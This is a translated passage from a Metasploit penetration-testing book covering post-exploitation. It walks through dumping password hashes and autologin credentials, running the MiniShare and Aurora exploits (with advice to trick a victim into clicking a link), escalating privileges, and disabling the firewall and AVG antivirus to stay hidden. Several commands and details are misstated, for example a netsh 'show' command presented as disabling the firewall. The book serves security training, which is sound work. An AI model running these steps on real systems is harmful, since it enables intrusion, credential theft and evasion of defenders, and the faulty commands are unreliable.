![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_01.jpg)

1.  首先，我们将通过执行`sysinfo`命令来检查系统信息。输入`sysinfo`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_02.jpg)

1.  执行命令后，我们可以看到计算机名称为**EXPLOIT**。运行在受害者系统上的操作系统是带有 x86 架构的 Windows XP 服务包 2。使用的语言是美国英语。让我们检查具有 meterpreter 附加到它的进程。为此，我们使用`getpid`命令，因此输入`getpid`，它将显示 meterpreter 的进程 ID：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_03.jpg)

1.  `getpid`命令显示的进程 ID 为**1008**。现在我们将检查受害系统进程列表中正在运行的进程，因此输入`ps`命令：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_04.jpg)

我们可以清楚地看到进程**1008**正在作为`svchost.exe`运行；它位于`windows/system32`目录下。

1.  现在检查受害者的系统是否是虚拟机。为此，输入`run checkvm`命令：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_05.jpg)

运行后利用脚本后，它检测到操作系统正在 VirtualBox 虚拟机下运行。

1.  现在让我们检查受害者是否活跃。为此，我们输入`idletime`。执行此脚本将显示受害者的最近活动时间：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_06.jpg)

受害者活跃并且他们最近的活动只有 16 秒。

1.  通过执行`run get_env`命令运行另一个 meterpreter 脚本来检查受害者的系统环境：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_07.jpg)

我们可以看到系统的环境信息，例如处理器数量、操作系统、Windows 目录路径等。

1.  现在让我们通过输入`ipconfig`命令来检查受害系统的 IP 地址：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_08.jpg)

1.  在这里，我们可以看到受害者 PC 的 IP 地址；现在如果我们想要查看完整的网络设置，我们将输入`route`命令：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_09.jpg)

在这里，我们可以看到受害者系统的网络路由设置。

1.  我们运行的另一个重要脚本用于映射受害者系统的安全配置，称为`countermeasure`。输入`run getcountermeasure`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_10.jpg)

通过运行此脚本，我们可以看到防火墙配置文件。

1.  现在我们将启用受害者的远程桌面协议服务。输入`run getgui`；它显示可用选项的列表。我们可以在**OPTIONS**中看到`-e`语法用于启用 RDP，因此输入`run getgui -e`命令：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_11.jpg)

1.  我们期望在 Windows 操作系统上启用的另一个常见服务是`telnet`服务。`gettelnet`脚本用于在受损的机器上启用`telnet`服务。因此，输入`run gettelnet`，它将显示可用选项的列表。我们可以注意到**OPTIONS**部分中使用`-e`来启用`telnet`服务，因此输入`run gettelnet -e`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_12.jpg)

1.  让我们通过运行另一个脚本来查看受害者的本地子网。输入`run get_local_subnets`命令：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_13.jpg)

我们可以在前面的截图中看到受害者系统的本地子网。

1.  另一个有趣的脚本是`hostedit`。它允许攻击者在 Windows 主机文件中添加主机条目。输入`run hostedit`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_14.jpg)

1.  运行此脚本后，我们可以看到`hostedit`的使用语法。输入`run hostedit -e 127.0.0.1, www.apple.com`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_15.jpg)

在这里，我们可以看到已将主机记录添加到受害者的主机文件中。

1.  为了验证，我们可以打开受害者系统目录`c:\windows\system32\drivers\etc\`。在这里，我们可以找到主机文件，并在记事本中打开此文件，我们可以看到已添加的主机：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_16.jpg)

1.  现在让我们列举一下目前在受害者系统上已登录的用户数量。为此，我们将输入`run enum_logged_on_users`。使用此命令会显示可用选项的列表，我们可以在**OPTIONS**中看到`-c`用于当前已登录用户。因此，输入`run enum_logged_on_users`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_17.jpg)

在前面的截图中，我们可以看到用户/受害者当前已登录到系统中。

1.  在列举用户之后，我们接着列举受害者系统上安装的应用程序。因此，要列举已安装应用程序的列表，我们只需要输入`run get_application_list`，它将显示所有已安装的应用程序：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_18.jpg)

在前面的截图中，我们可以看到已安装应用程序的列表。

1.  之后，我们继续列举受害者的驱动器信息，以收集物理驱动器信息。输入`run windows/gather/forensics/enum_drives`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_19.jpg)

在前面的截图中，我们可以看到驱动器名称和字节大小。

1.  我们还可以看到受害者操作系统的产品密钥。这是一个了不起的脚本，可以通过输入`run windows/gather/enum_ms_product_keys`来使用；它将显示序列号：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_20.jpg)

使用此命令，在前面的截图中，我们可以看到安装在受害者 PC 上的 Windows 操作系统的产品密钥。

1.  现在让我们通过运行另一个 meterpreter 脚本来检查受害者系统中的 Windows`autologin`功能。输入`run windows/gather/credentials/windows_autologin`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_21.jpg)

我们可以看到在前面的截图中，受害者系统的用户名是`victim`，密码为空。他正在使用他的系统而不需要密码。

1.  现在我们要运行的另一个重要脚本是用于枚举系统信息。这将通过运行不同的实用程序和命令从受害者系统中转储一些有价值的信息，如哈希和令牌。键入`run winenum`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_22.jpg)

1.  在运行脚本后，我们注意到许多命令在受害者系统上运行，并且所有报告都保存在`/root/.msf4/logs/scripts/winenum/EXPLOIT-0FE265D 20130327.2532`目录中。现在我们可以浏览此目录并查看一些结果：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_23.jpg)

1.  在这个目录中，我们可以看到一些数据以 TXT 和 CSV 格式保存。现在我们可以根据需要打开任何报告。在这里，我们正在打开`hashdump.txt`，所以键入`cat hashdump.txt`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_24.jpg)

在这里我们可以看到不同用户的所有转储哈希。

1.  我们将在此实验中使用的最后一个脚本称为`scraper`。此脚本可用于从受害者系统中转储其他枚举脚本中未包含的附加信息（例如提取整个注册表键）。键入`run scraper`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_25.jpg)

我们可以在前面的截图中看到，在运行脚本后，它开始转储哈希、注册表键和基本系统信息，并将报告保存在`.msf4/logs/scripts/scraper/192.168.0.104_20130327.563889503`目录中。

![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_26.jpg)

我们可以看到许多结果以 TXT 格式保存在这个目录中。

1.  现在我们将打开一个结果作为示例，所以键入`cat services.txt`：![教程](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_07_27.jpg)

在前面的截图中，我们可以看到受害者系统上运行的不同 Windows 服务。

# 摘要

在本章中，我们经历了后渗透的第一阶段，试图更好地了解我们的受害者。一旦我们有了 meterpreter 会话运行，我们利用它来收集重要的系统信息、硬件详细信息等。我们使用 meterpreter 脚本来转储 Windows 注册表和密码哈希。攻击者能够获得受害者机器上安装的程序列表。使用后渗透技术，我们能够枚举受害者的硬盘信息，包括物理和逻辑分区。进一步渗透受害者系统，我们可以收集网络信息并对主机记录文件进行更改。在下一章中，我们将继续进行后渗透的下一个阶段：权限提升。

# 参考资料

以下是一些有用的参考资料，可以进一步阐明本章涉及的一些主题：

+   [`www.pentest-standard.org/index.php/Post_Exploitation`](http://www.pentest-standard.org/index.php/Post_Exploitation)

+   [`www.securitytube.net/video/2637`](http://www.securitytube.net/video/2637)

+   [`cyruslab.wordpress.com/2012/03/09/metasploit-post-exploitation-with-meterpreter-2/`](http://cyruslab.wordpress.com/2012/03/09/metasploit-post-exploitation-with-meterpreter-2/)

+   [`em3rgency.com/meterpreter-post-exploitation/`](http://em3rgency.com/meterpreter-post-exploitation/)


# 第八章：后期利用-特权提升

在上一章中，我们介绍了后期利用技术。后期利用分为五个不同的阶段。本章将深入了解后期利用的第一个阶段，即特权提升。我们将介绍如何在获得对系统访问权限后提升我们的特权的新技术和诀窍。

# 理解特权提升

简而言之，特权提升是获取对通常受保护且拒绝普通或未经授权用户访问的资源的提升特权。通过提升的特权，恶意用户可能执行未经授权的操作，对计算机或整个网络造成损害。特权提升后可以做的一些简单示例包括安装用于不道德用途的恶意软件、删除用户文件、拒绝特定用户的资源访问以及查看私人信息。它通常是通过利用基于漏洞的漏洞来妥协系统而发生的。这种安全配置错误或弱点可能导致安全边界或身份验证被绕过，从而实现特权提升。

特权提升大致分为两种主要形式：

+   **垂直特权提升**：在这种特权提升中，较低特权的用户或应用程序可能访问仅供授权或管理员用户使用的功能。这个功能也被称为特权提升。

+   **水平特权提升**：这种特权提升通常在水平尺度上发生，涉及用户权限。普通用户访问为另一个普通用户保留的资源。这再次是对其他人资源的提升，因为从技术上讲，只有他应该对他的资源拥有特权。

由于多种原因可能存在特权提升的情况-网络入侵、漏洞暴露、未管理的帐户、安全性模糊等。通常采用的方法是登录并尝试获取有关计算机的一些基本信息，类似于信息收集场景。然后攻击者可能会尝试获取私人信息，或者可能与一些重要文件相关联的一些用户凭据。

如果我们谈论 Metasploit，运行客户端漏洞利用只会给我们带来具有有限用户权限的会话。这可能严重限制攻击者妥协受害者机器到他想要的级别；例如，他可能无法转储密码哈希、更改系统设置或安装后门木马。通过 Metasploit 中非常强大的脚本，例如 getsystem，我们可能能够在根系统上获得系统级权限。

## 利用受害者的系统

现在我们将开始特权提升的教程阶段。在这里，我们将通过在一个名为 Mini-share 的小型程序中运行缓冲区溢出利用来利用受害者的系统。Mini-share 是免费的文件共享软件。它是用于 Microsoft Windows 的免费 Web 服务器软件。如果您有 Web 托管，这是一种快速简便的文件共享方式。现在打开`msfconsole`并输入`use exploit/windows/http/minishare_get_overflow`。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_01.jpg)

之后，输入`show options`以详细查看我们在利用中需要设置的所有选项。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_02.jpg)

现在设置所有必需的选项；正如我们在前面的截图中所看到的，`RHOST`是必需的。`RHOST`选项是指远程主机地址，即目标 IP 地址。输入`set RHOST <受害者 IP>`；例如，在这里我们使用`set RHOST 192.168.0.102`。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_03.jpg)

第二个必需的选项是`RPORT`。`RPORT`选项是指远程端口地址，即目标端口号。输入`set RPORT <受害者端口>`；例如，在这里我们使用`set RPORT 80`。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_04.jpg)

现在选择目标系统类型。输入 `show targets`，它将显示所有易受攻击的目标操作系统。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_05.jpg)

现在根据受害者的系统选择目标。在这里，我们选择目标 3。所以我们输入 `set TARGET 3`。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_06.jpg)

现在是利用目标的时候。所以我们输入 `exploit`。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_07.jpg)

我们可以看到在利用受害者的机器后，我们有一个 `Meterpreter` 会话。让我们偷偷看一下受害者的系统。输入 `getuid` 来获取用户 ID。从下面的截图中我们可以看到用户 ID 是 `NT AUTHORITY\SYSTEM`。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_08.jpg)

之后，我们运行 `getsystem -h` 来升级受害者系统中的权限。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_09.jpg)

我们可以在之前的截图中看到运行 `getsystem -h`，给了我们一堆特权升级的选项。第一个选项是 `0：所有可用技术`，它使用默认的所有技术来升级特权。

特权升级选项中使用的术语如下：

+   **命名管道**：它是一种机制，使应用程序能够在本地或远程进行进程间通信。创建管道的应用程序称为管道服务器，连接到管道的应用程序称为管道客户端。

+   **模拟**：它是线程以与拥有该线程的进程不同的安全上下文中执行的能力。模拟使服务器线程能够代表客户端执行操作，但在客户端的安全上下文的限制内。当客户端拥有比服务器更多的权限时，问题就出现了。操作系统的每个用户都提供了一个唯一的令牌 ID。该 ID 用于检查系统中各个用户的权限级别。

+   **令牌复制**：它通过低权限用户复制高权限用户的令牌 ID 来工作。然后低权限用户以与高权限用户类似的方式行事，并获得与高权限用户相同的所有权利和权限。

+   **KiTrap0D**：它于 2010 年初发布，影响了微软此前制作的几乎所有操作系统。当在 32 位平台上启用对 16 位应用程序的访问时，它未正确验证某些 BIOS 调用，这允许本地用户通过在线程环境块（TEB）中制作 VDM_TIB 数据结构来获得特权，从而不正确地处理涉及#GP 陷阱处理程序（nt!KiTrap0D）的异常，也称为 Windows 内核异常处理程序漏洞。

让我们使用第一个选项，通过输入 `getsystem -t 0` 来使用所有可用的技术。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_10.jpg)

我们可以看到在运行命令 `...got system (via technique 1).` 后的消息。现在我们通过输入 `ps` 命令来检查进程列表。

![利用受害者的系统](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_11.jpg)

## 通过后期利用进行特权升级

现在我们将展示另一种特权升级技术 - 使用后期利用模块。该模块使用内置的 `getsystem` 命令将当前会话从管理员用户帐户升级到系统帐户。当我们获得一个 `Meterpreter` 会话时，输入 `run post/windows/escalate/getsystem`。该模块将自动升级管理员权限。

![通过后期利用进行特权升级](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_12.jpg)

现在我们将使用另一个后期利用脚本进行本地权限提升。该模块利用现有的管理权限来获得一个 SYSTEM 会话。如果第一次失败，该模块会检查现有的服务，并寻找易受攻击的不安全文件权限。之后，它会尝试重新启动替换的易受攻击的服务来运行有效载荷。因此，成功利用后会创建一个新会话。

输入`run post/windows/escalate/service_permissions`；它将打开另一个`Meterpreter`会话。

![通过后期利用进行权限提升](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_13.jpg)

只需尝试不同的入侵目标系统的方法，然后提升管理员权限。输入`use exploit/windows/browser/ms10_002_aurora`。

![通过后期利用进行权限提升](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_14.jpg)

现在输入`show options`以详细查看我们需要在入侵中设置的所有选项。

![通过后期利用进行权限提升](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_15.jpg)

之后，设置所有在前面截图中显示的必需选项。`SRVHOST`选项是指要监听的本地主机地址。输入`set SRVHOST <受害者 IP>`；例如，这里我们使用`set SRVHOST 192.168.0.109`。

最后，我们通过输入`exploit`来利用目标。

![通过后期利用进行权限提升](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589OS_08_16.jpg)

我们可以看到 Metasploit 创建了一个 URL。现在我们只需要把这个 URL 给受害者，并引诱他点击它。在 Internet Explorer 中打开这个 URL 后，受害者将获得一个`Meterpreter`会话，之后你可以进行权限提升攻击。

# 摘要

在本章中，我们学习了如何在我们已经入侵的系统中提升我们的权限。我们使用了各种脚本和后期利用模块来完成这项任务。我们的最终目标是获得系统管理员的权限级别，以便根据我们的需求使用受害者的机器。我们成功地完成了这项任务，并获得了对受害者机器的管理员权限。仅仅入侵系统并不能实现最终目标；我们需要能够泄露受害者的私人信息或对他的计算机进行严重更改。通过 Metasploit 进行权限提升的能力解锁了这种力量，并帮助我们实现了我们的目标。在下一章中，我们将继续进行下一个后期利用阶段——清除我们的痕迹，以免在我们入侵系统后被抓住。

# 参考资料

以下是一些有用的参考资料，可以进一步了解本章涉及的一些主题：

+   [`en.wikipedia.org/wiki/Privilege_escalation`](http://en.wikipedia.org/wiki/Privilege_escalation)

+   [`www.offensive-security.com/metasploit-unleashed/Privilege_Escalation`](http://www.offensive-security.com/metasploit-unleashed/Privilege_Escalation)

+   [`vishnuvalentino.com/tips-and-trick/privilege-escalation-in-metasploit-meterpreter-backtrack-5/`](http://vishnuvalentino.com/%E2%80%A8tips-and-trick/privilege-escalation-in-metasploit-meterpreter-backtrack-5/)

+   [`www.redspin.com/blog/2010/02/18/getsystem-privilege-escalation-via-metasploit/`](http://www.redspin.com/blog/2010/02/18/getsystem-privilege-escalation-via-metasploit/)

+   [`www.securitytube.net/video/1188`](http://www.securitytube.net/video/1188)


# 第九章：后渗透 - 清除痕迹

我们在上一章中介绍了使用 Metasploit 进行权限提升的技术。接下来，我们将进入后渗透的下一个阶段，即通过删除日志和禁用防火墙和防病毒系统来清除痕迹和追踪。在本章中，我们将学习在系统被入侵后如何规避防火墙和防病毒系统的警报。对于黑客来说，另一个重要的问题是他的工作有多隐蔽。这就是所谓的清除痕迹和追踪；在这里，一个恶意黑客清除日志和任何可能因他的入侵而创建的警报。

# 禁用防火墙和其他网络防御

为什么防火墙很重要？防火墙基本上是阻止未经授权进入系统或网络的软件或硬件。防火墙还会跟踪入侵和安全漏洞。如果防火墙配置良好，每次未经授权的进入都会被阻止并记录在安全日志中。它控制着进出的网络流量并分析数据包；基于此，它决定是否应该允许数据包通过防火墙。因此，如果恶意用户能够远程利用系统，第一步应该是禁用防火墙，以便防火墙不再记录任何进入的警报，这可能显示入侵的证据。

![禁用防火墙和其他网络防御](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_01.jpg)

防火墙分为三种不同类型：

1.  **数据包过滤防火墙**：这些类型的防火墙与 OSI 模型的前三层有关，同时也在传输层上有一些帮助，用于源和目的端口号。当数据包朝向数据包过滤防火墙传输时，它会根据设定的规则进行分析匹配。如果数据包通过了防火墙的过滤器，就允许其进入网络，否则就会被阻止。

1.  **有状态防火墙**：这些也被称为第二代防火墙。顾名思义，这些防火墙根据网络连接的状态工作。在整个状态期间，它确定是否允许数据包进入网络。

1.  **应用防火墙**：这些被称为第三代防火墙。应用防火墙适用于诸如 HTTP、SMTP 和 SSH 之类的应用程序和协议。它们还有助于检测不受欢迎的协议是否试图绕过允许端口上的防火墙。

防火墙是恶意用户的最大敌人之一。它阻止恶意用户使用后渗透脚本并在受损系统上创建后门。因此，攻击者的第一个目标应该是在成功入侵系统后禁用防火墙。在本章中，我们将看到如何通过 Metasploit 实际禁用防火墙，然后处理未经授权的区域。

在本节中，我们将向您展示如何在受害者系统中禁用防火墙。在这之前，我们将检查受害者系统中防火墙的状态；也就是说，它是启用还是禁用的。为此，我们将使用一个后渗透脚本。因此输入`run getcountermeasure`。

![禁用防火墙和其他网络防御](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_02.jpg)

我们可以在上述截图中看到受害者系统中的防火墙已启用。还有另一种方法可以检查受害者系统中的防火墙设置 - 通过访问他/她的命令提示符。为此，我们必须从 Meterpreter 中打开受害者的 shell。从 Meterpreter 中打开 shell 的技术已经在之前的章节中介绍过。我们访问命令提示符并输入`netsh firewall show opmode`。

![禁用防火墙和其他网络防御](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_03.jpg)

现在我们可以检查系统防火墙的设置。让我们通过检查受害者系统来验证一下，看看防火墙是否已启用。

![禁用防火墙和其他网络防御](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_04.jpg)

我们可以清楚地看到防火墙处于活动状态。现在我们需要将其禁用。输入`netsh firewall show opmode mode=disable`。

![禁用防火墙和其他网络防御](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_05.jpg)

执行上一个命令后，该命令将永久禁用防火墙。现在让我们检查受害者系统中防火墙的状态。

![禁用防火墙和其他网络防御](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_06.jpg)

## 通过 VBScript 禁用防火墙

还有另一种禁用防火墙的方法，即在受害者系统上执行一个小的 Visual Basic 脚本。首先，我们必须在文本文件中编写三行代码。

```
Set objFirewall = CreateObject("HNetCfg.FwMgr")
Set objPolicy = objFirewall.LocalPolicy.CurrentProfile

objPolicy.FirewallEnabled = FALSE
```

现在将此代码保存为`.vbs`扩展名。例如，在这里我们将其命名为`disable.vbs`。

![通过 VBScript 禁用防火墙](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_07.jpg)

我们的脚本已准备就绪；现在我们必须将此脚本上传到受害者的系统中。要上传，我们将使用 Meterpreter 上传命令。例如，在我们的案例中，我们输入`upload root/Desktop/disable.vbs C:\`。

![通过 VBScript 禁用防火墙](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_08.jpg)

因此，我们已将我们的`disable.vbs`脚本上传到受害者的`C:`驱动器中。让我们在受害者的`C:`驱动器中检查脚本是否已上传。

![通过 VBScript 禁用防火墙](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_09.jpg)

我们可以在受害者的`C:`驱动器中看到我们的`disable.vbs`文件。现在我们可以远程执行此脚本。要执行此脚本，我们必须输入`cd C:\`以进入此驱动器。

![通过 VBScript 禁用防火墙](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_10.jpg)

我们现在在受害者的`C:`驱动器中，可以执行脚本。因此输入`disable.vbs`，它将在受害者的系统中执行。

![通过 VBScript 禁用防火墙](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_11.jpg)

让我们检查受害者系统的防火墙是否已被我们的脚本禁用。

![通过 VBScript 禁用防火墙](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_12.jpg)

是的，我们的 VBScript 代码成功禁用了防火墙。

## 杀毒软件关闭和日志删除

让我们看看杀毒软件中的一些利用问题。攻击者在利用系统后需要注意各种事项。如果他想玩得安全并且不被发现，这一点非常重要。杀毒软件是合法用户的主要防御系统之一，如果攻击者能够禁用它，他就成功地完全控制了系统并且可以不被发现。因此，对于攻击者来说，禁用杀毒软件作为一种预防措施来隐藏自己的存在非常重要。在本章中，我们将学习如何通过 Meterpreter 后利用脚本禁用和终止不同的杀毒软件。

![杀毒软件关闭和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_13.jpg)

在本节中，我们将看到如何通过终止其进程来停止杀毒软件。为此，我们将使用一个名为 killav 的后利用 Meterpreter 脚本。我们将展示 killav 脚本的源代码，并看看该脚本如何能够终止杀毒软件的进程。

使用文本编辑器打开位于`opt/framework/msf3/scripts/killav.rb`的`killav.rb`脚本。

![杀毒软件关闭和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_14.jpg)

我们可以看到 killav 脚本中包含的知名杀毒软件的进程名称列表。当我们运行此脚本时，它会在受害者的系统中查找进程名称，该名称也应包含在此脚本中，然后终止该进程。

在我们的案例中，受害者使用的是 AVG 2012 杀毒软件。因此，我们首先将从受害者的任务管理器中检查 AVG 杀毒软件的进程名称。

![杀毒软件关闭和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_15.jpg)

我们可以看到 AVG 杀毒软件的进程名称`avgrsx.exe`正在运行。让我们检查进程名称是否包含在`killav.rb`脚本中。

![杀毒软件关闭和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_16.jpg)

我们可以看到进程名已经包含在内，所以脚本将成功运行。输入`run killav`。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_17.jpg)

我们可以从前面截图的结果中看到，该进程已被终止。现在我们将访问受害者的命令提示符，输入`tasklist`来检查受害者系统中正在运行的所有进程。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_18.jpg)

我们还可以看到受害者系统中运行了很多进程；我们现在要对这些进程进行分类，看它们属于哪个组。输入`tasklist /svc`。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_19.jpg)

我们只对 AVG 杀毒软件服务感兴趣，而不关心任务列表中显示的其他服务。因此，我们将通过输入`tasklist /svc | find /I "avg"`来精确搜索。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_20.jpg)

执行前面截图中显示的命令后，我们可以看到只有与 AVG 相关的进程被显示出来。我们必须终止所有进程，但两个进程`avgwdsvc.exe`和`AVGIDSAgent.exe`在终止时会引起麻烦。这个麻烦的原因是它们是无法停止的，如下一截图所示。在这里，我们通过输入`sc queryex avgwd`来查看`avgwd`的属性。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_21.jpg)

您可能会注意到前面截图中的状态部分显示，该服务无法停止，也无法暂停。但我们可以禁用此服务来摆脱问题。

让我们检查另一个进程`AVGIDSAgent`的属性。输入`sc queryex AVGIDSAgent`。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_22.jpg)

我们在这里看到相同的结果-该服务无法停止，也无法暂停。

现在我们要禁用`avgwd`进程。输入`sc config avgwd start= disabled`。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_23.jpg)

如前面的截图所示，`avgwd`服务已被禁用。现在让我们禁用另一个进程`AVGIDSAgent`。输入`sc config AVGIDSAgent start= disabled`。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_24.jpg)

现在我们退出受害者的命令提示符，并通过在 Meterpreter 会话中输入`reboot`命令来重启受害者的系统。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_25.jpg)

成功重启后，我们再次进入受害者系统的 Meterpreter 会话。现在我们要做的是搜索受害者的任务列表中的所有 AVG 进程，并验证我们禁用的这两个进程是否仍在运行。我们打开 shell，输入`tasklist /svc | find /I "avg"`。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_26.jpg)

我们可以看到，`avgwd`和`AVGIDSAgent`这两个进程在前面的截图中没有显示出来。这意味着这些进程已成功被禁用。我们可以轻松终止其他 AVG 进程。要终止一个进程，输入`taskkill /F /IM "avg*"`。

![杀毒软件杀死和日志删除](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-mtspl-exp-dev/img/3589_09_27.jpg)

执行命令后，我们可以看到所有进程都已成功终止。

清除痕迹的下一个阶段将是清除系统日志。系统和应用程序日志是由操作系统和运行在其上的应用程序记录的事件。从取证的角度来看，这些事件非常重要，因为它们显示了系统中发生的变化或事件的状态。任何可疑活动也会被记录；因此，对于攻击者来说，清除这些日志以保持隐藏是非常重要的。

